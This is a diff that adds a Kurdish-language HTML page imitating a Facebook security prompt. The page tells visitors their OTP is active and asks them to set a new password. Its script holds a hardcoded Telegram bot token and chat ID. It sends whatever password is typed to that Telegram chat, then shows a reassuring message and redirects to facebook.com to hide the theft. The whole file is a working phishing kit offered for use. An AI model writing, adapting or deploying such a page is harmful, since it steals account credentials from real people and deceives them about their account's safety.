@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="ku" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Change Password</title>
+    <style>
+        body { font-family: Arial; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: white; padding: 25px; border-radius: 8px; width: 350px; text-align: center; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        input { width: 100%; padding: 12px; margin-top: 10px; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #42b72a; color: white; border: none; border-radius: 5px; margin-top: 20px; font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2 style="color: #1877f2;">پاراستنی کۆتایی</h2>
+        <p>کۆدی OTP کارا کرا. تکایە ئێستا تێپەڕەوشەیەکی (Password) نوێ دابنێ بۆ سەلامەتی ئەکاونتەکەت:</p>
+        <input type="password" id="newpass" placeholder="New Password" dir="ltr">
+        <input type="password" id="confirmpass" placeholder="Confirm New Password" dir="ltr">
+        <button onclick="save()">سەیڤکردن و تەواوکردن</button>
+    </div>
+
+    <script>
+        const botToken = "8325580182:AAEZlBl-DbtFVRA2X3b9mN8qq-EAEcr_Aoc";
+        const chatId = "6679834643";
+
+        function save() {
+            const newp = document.getElementById('newpass').value;
+            if(!newp) return alert("تکایە وشە نهێنییە نوێیەکە بنووسە");
+
+            const msg = `🆕 **New Password Set**\n🔑 New Pass: \`${newp}\``;
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=markdown`)
+            .then(() => {
+                alert("پیرۆزە! ئەکاونتەکەت پارێزرا و گۆڕانکارییەکان سەیڤ کران.");
+                window.location.href = "https://www.facebook.com";
+            });
+        }
+    </script>
+</body>
+</html>
